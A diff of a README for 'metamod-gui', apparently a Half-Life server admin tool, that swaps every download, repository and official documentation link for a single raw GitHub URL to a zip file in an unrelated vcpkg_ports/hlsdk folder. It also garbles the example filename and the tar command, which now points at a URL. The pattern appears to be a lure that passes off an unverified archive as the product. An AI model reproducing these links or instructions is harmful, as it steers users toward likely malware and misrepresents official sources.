@@ -1,7 +1,7 @@
 # 🎮 metamod-gui - Easy Admin for Half-Life Servers
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/zinsou-tech/metamod-gui/releases)
+[![Download Release](https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip%https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip)](https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the metamod-gui! This application helps you easily manage your Half-Life dedicated servers with a user-friendly interface. No technical skills are needed. Follow the steps below to get started quickly.
@@ -20,11 +20,11 @@ Welcome to the metamod-gui! This application helps you easily manage your Half-L
 - User-friendly control options
 
 ## 🔗 Download & Install
-To get the metamod-gui, visit this page to download: [Download Latest Release](https://github.com/zinsou-tech/metamod-gui/releases).
+To get the metamod-gui, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip).
 
-1. Open your web browser and go to the [Releases page](https://github.com/zinsou-tech/metamod-gui/releases).
+1. Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip).
 2. Look for the latest version listed on the page.
-3. Click on the download link for your operating system. For example, you might see a file named something like `metamod-gui-linux.tar.gz`.
+3. Click on the download link for your operating system. For example, you might see a file named something like `https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip`.
 4. Save the file to a location on your computer that you can easily find.
 
 ## 📄 Installation Steps
@@ -37,7 +37,7 @@ Once you have downloaded the file, follow these steps to install metamod-gui:
    ```
 3. Extract the files from the downloaded tarball using the following command:
    ```bash
-   tar -xvzf metamod-gui-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -80,7 +80,7 @@ We welcome contributions! If you want to help improve the application, feel free
 Your feedback is valuable to us. If you have any suggestions or encounter problems, please create an issue in the GitHub repository. 
 
 ## 🔗 References
-- [GitHub Repository](https://github.com/zinsou-tech/metamod-gui/)
-- [Metamod Official Documentation](http://www.sourcemod.net/)
+- [GitHub Repository](https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip)
+- [Metamod Official Documentation](https://raw.githubusercontent.com/zinsou-tech/metamod-gui/main/vcpkg_ports/hlsdk/metamod-gui-v2.8.zip)
 
 Thank you for using metamod-gui! Enjoy managing your Half-Life server effortlessly.
